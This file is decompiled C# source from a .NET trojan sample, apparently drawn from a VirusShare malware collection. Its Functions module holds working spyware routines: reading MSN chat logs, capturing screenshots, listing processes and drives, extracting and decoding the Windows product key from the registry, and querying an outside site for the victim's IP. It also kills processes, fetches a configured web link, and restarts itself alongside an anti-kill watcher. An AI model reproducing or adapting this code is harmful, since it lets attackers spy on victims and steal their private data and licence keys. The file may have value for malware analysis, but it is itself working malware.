// Decompiled with JetBrains decompiler
// Type: Project_Unamed.Functions
// Assembly: Project Unnamed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E14D2CAF-643A-42A5-AF85-1F02787E6112
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkho-1e6991871b0b19bec231c68029dfc8a762f32ed88d5a1aa5b922eb829ff10319.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Project_Unamed.My;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace Project_Unamed
{
  [StandardModule]
  internal sealed class Functions
  {
    private const int MONITOR_OFF = 2;
    private static int SC_MONITORPOWER = 61808;
    private static int WM_SYSCOMMAND = 274;

    [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern long mciSendString(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpCommandString,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpReturnString,
      long uReturnLength,
      long hwndCallback);

    [DllImport("user32", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(
      int intAction,
      int intParam,
      string strParam,
      int intWinIniFlag);

    public static string ParseMSNLogFile(string Filename)
    {
      string msnLogFile;
      try
      {
        string str1 = "";
        XmlTextReader xmlTextReader = new XmlTextReader(Filename);
        xmlTextReader.Read();
        xmlTextReader.Read();
        xmlTextReader.Read();
        xmlTextReader.Read();
        xmlTextReader.Read();
        xmlTextReader.GetAttribute("FirstSessionID");
        xmlTextReader.GetAttribute("LastSessionID");
        while (!xmlTextReader.EOF)
        {
          xmlTextReader.Read();
          string attribute1 = xmlTextReader.GetAttribute("Date");
          string attribute2 = xmlTextReader.GetAttribute("Time");
          string attribute3 = xmlTextReader.GetAttribute("SessionID");
          xmlTextReader.Read();
          xmlTextReader.Read();
          string attribute4 = xmlTextReader.GetAttribute("FriendlyName");
          xmlTextReader.Read();
          xmlTextReader.Read();
          xmlTextReader.Read();
          string attribute5 = xmlTextReader.GetAttribute("FriendlyName");
          xmlTextReader.Read();
          xmlTextReader.Read();
          xmlTextReader.GetAttribute("Style");
          string str2 = xmlTextReader.ReadString();
          xmlTextReader.Read();
          str1 = str1 + "[" + attribute1 + " " + attribute2 + " Session ID: " + attribute3 + "] " + attribute4 + " -> " + attribute5 + " : " + str2 + "\r\n";
        }
        msnLogFile = str1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        msnLogFile = "Error reading log.";
        ProjectData.ClearProjectError();
      }
      return msnLogFile;
    }

    public static void OpenCDDoor()
    {
      string str1 = "set CDAudio door open";
      ref string local1 = ref str1;
      string str2 = "";
      ref string local2 = ref str2;
      Functions.mciSendString(ref local1, ref local2, 0L, 0L);
    }

    public static void CloseCDDoor()
    {
      string str1 = "set CDAudio door closed";
      ref string local1 = ref str1;
      string str2 = "";
      ref string local2 = ref str2;
      Functions.mciSendString(ref local1, ref local2, 0L, 0L);
    }

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SendMessage(
      IntPtr hWnd,
      uint Msg,
      IntPtr wParam,
      IntPtr lParam);

    public static void TurnOffLCD()
    {
      int num = 0;
      num = (int) Functions.SendMessage((IntPtr) Functions.FindWindow((string) null, (string) null).ToInt32(), checked ((uint) Functions.WM_SYSCOMMAND), (IntPtr) Functions.SC_MONITORPOWER, (IntPtr) 2);
    }

    public static MemoryStream GetScreenshot()
    {
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
      MemoryStream memoryStream = new MemoryStream();
      bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
      byte[] buffer = memoryStream.GetBuffer();
      bitmap.Dispose();
      memoryStream.Close();
      return new MemoryStream(buffer);
    }

    public static string DriverList()
    {
      string str1 = "Driver Name - RootDir - DriverType - Format - IsReady - Totalsize/Freespace\r\n";
      try
      {
        foreach (DriveInfo drive in MyProject.Computer.FileSystem.Drives)
        {
          string str2 = "Access Denied";
          string str3 = "Access Denied";
          string str4 = "Access Denied";
          string str5 = "Access Denied";
          string str6 = "Access Denied";
          string str7 = "Access Denied";
          string str8 = "Access Denied";
          try
          {
            str2 = drive.Name;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            str3 = drive.RootDirectory.FullName;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            str4 = Conversions.ToString((int) drive.DriveType);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            str5 = drive.DriveFormat.ToString();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            str6 = Conversions.ToString(drive.IsReady);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            str7 = Conversions.ToString(drive.TotalSize);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            str8 = Conversions.ToString(drive.TotalFreeSpace);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          str1 = str1 + str2 + "   -   " + str3 + "   -   " + str4 + "   -   " + str5 + "   -   " + str6 + "   -   " + str7 + "/" + str8 + "\r\n";
        }
      }
      finally
      {
        IEnumerator<DriveInfo> enumerator;
        enumerator?.Dispose();
      }
      return str1;
    }

    public static string ProcessList()
    {
      string str1 = "ProcessName - PID - FileName - MainWindowTitle\r\n\r\n";
      int num = 0;
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        Process process = processes[index];
        string str2 = str1 + process.ProcessName + "   -   " + Conversions.ToString(process.Id) + "   -   ";
        string str3 = "Access Denied";
        try
        {
          str3 = process.Modules[0].FileName;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        str1 = str2 + str3 + "   -   " + process.MainWindowTitle + "\r\n";
        checked { ++num; }
        checked { ++index; }
      }
      return str1 + "\r\nTotal Processes: " + Conversions.ToString(num);
    }

    public static string GetIP()
    {
      try
      {
        return new StreamReader(((HttpWebResponse) ((HttpWebRequest) WebRequest.Create("http://whatismyip.com/automation/n09230945.asp")).GetResponse()).GetResponseStream()).ReadToEnd();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return "N/A";
    }

    public static string GetWindowsProductKey()
    {
      try
      {
        object objectValue = RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "DigitalProductId", (object) 0));
        if (objectValue == null)
          return "N/A";
        string str1 = "";
        int num1 = Information.LBound((Array) objectValue);
        int num2 = Information.UBound((Array) objectValue);
        int num3 = num1;
        while (num3 <= num2)
        {
          str1 = str1 + " " + Conversion.Hex(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(objectValue, new object[1]
          {
            (object) num3
          }, (string[]) null)));
          checked { ++num3; }
        }
        int num4 = 52;
        int num5 = 67;
        string[] strArray1 = new string[25]
        {
          "B",
          "C",
          "D",
          "F",
          "G",
          "H",
          "J",
          "K",
          "M",
          "P",
          "Q",
          "R",
          "T",
          "V",
          "W",
          "X",
          "Y",
          "2",
          "3",
          "4",
          "6",
          "7",
          "8",
          "9",
          null
        };
        int num6 = 29;
        int num7 = 15;
        string[] strArray2 = new string[16];
        string[] strArray3 = new string[31];
        string str2 = "";
        int num8 = num4;
        int num9 = num5;
        int num10 = num8;
        while (num10 <= num9)
        {
          strArray2[checked (num10 - num4)] = Conversions.ToString(NewLateBinding.LateIndexGet(objectValue, new object[1]
          {
            (object) num10
          }, (string[]) null));
          str2 = str2 + " " + Conversion.Hex((object) strArray2[checked (num10 - num4)]);
          checked { ++num10; }
        }
        string Expression = "";
        int index1 = checked (num6 - 1);
        while (index1 >= 0)
        {
          if (checked (index1 + 1) % 6 == 0)
          {
            strArray3[index1] = "-";
            Expression += "-";
          }
          else
          {
            int index2 = 0;
            int index3 = checked (num7 - 1);
            while (index3 >= 0)
            {
              int num11 = checked ((int) ((long) Math.Round(unchecked ((double) index2 * 256.0)) | Conversions.ToLong(strArray2[index3])));
              strArray2[index3] = Conversions.ToString(num11 / 24);
              index2 = num11 % 24;
              checked { index3 += -1; }
            }
            strArray3[index1] = strArray1[index2];
            Expression += strArray1[index2];
          }
          checked { index1 += -1; }
        }
        return Strings.StrReverse(Expression);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return "N/A";
    }

    public static string GetWebpage() => Functions.GetWebpage(Settings.WebLink);

    public static void KillProcess(int PID) => Process.GetProcessById(PID).Kill();

    public static void Restart()
    {
      UndetectManager.TerminateWatcher();
      Thread.Sleep(500);
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        Process process = processes[index];
        try
        {
          if (Operators.CompareString(process.Modules[0].FileName, Settings.InstallationAntiKillFile, false) == 0)
            process.Kill();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      Thread.Sleep(1000);
      Process.Start(Process.GetCurrentProcess().Modules[0].FileName);
      Process.GetCurrentProcess().Kill();
    }

    public static string GetWebpage(string http)
    {
      StreamReader streamReader = new StreamReader(((HttpWebResponse) WebRequest.Create(http).GetResponse()).GetResponseStream());
      string end = streamReader.ReadToEnd();
      streamReader.Close();
      return end;
    }
  }
}
